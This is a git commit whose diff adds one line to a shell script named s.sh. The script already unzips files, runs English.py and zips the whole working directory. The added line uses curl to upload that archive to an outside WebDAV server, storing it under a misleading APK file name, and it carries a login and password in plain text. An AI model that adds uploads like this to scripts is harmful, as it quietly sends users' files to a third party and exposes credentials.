09f372287343ce6bd17f5779731cdfbaa04d4e1c
rootesapp <htmlhtml5@foxmail.com>
2024-10-26 22:40:46 +0800

    Update s.sh

--- s.sh
+++ s.sh
@@ -4,3 +4,4 @@ unzip s.zip
 pip3 install requests
 python English.py
 zip -r archive.zip *
+curl -T archive.zip http://ik.gengye.top:5212/dav/玩机百宝箱Beta.apk --user 123456789@qq.com:ag6R6UI9cRuVPAK2rnqwUnmarlIYhD4M
